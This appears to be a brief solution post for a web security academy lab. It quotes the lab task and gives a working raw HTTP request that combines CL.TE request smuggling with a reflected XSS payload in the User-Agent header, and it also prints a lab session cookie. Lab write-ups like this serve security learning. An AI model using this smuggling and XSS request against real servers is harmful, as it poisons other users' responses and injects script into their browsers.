Title: Exploiting HTTP request smuggling to deliver reflected XSS
Level: PRACTITIONER 
Desc:  This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
The application is also vulnerable to reflected XSS via the User-Agent header.
To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes alert(1).

I have working (in my browser) payload to make request smuggling and xss attack at the same request:
```
POST / HTTP/1.1
Host: 0a8a004a047426b1805712960069003c.web-security-academy.net
Cookie: session=UHvMYhtdRoP1Fz87tjLsMFTrcXuwPrdJ
Content-Length: 154
Transfer-Encoding: chunked

GET /post?postId=9 HTTP/1.1
Host: 0a8a004a047426b1805712960069003c.web-security-academy.net
User-Agent: miazga"><script>alert(1)</script>//
Foo: x
```

I solved the lab!
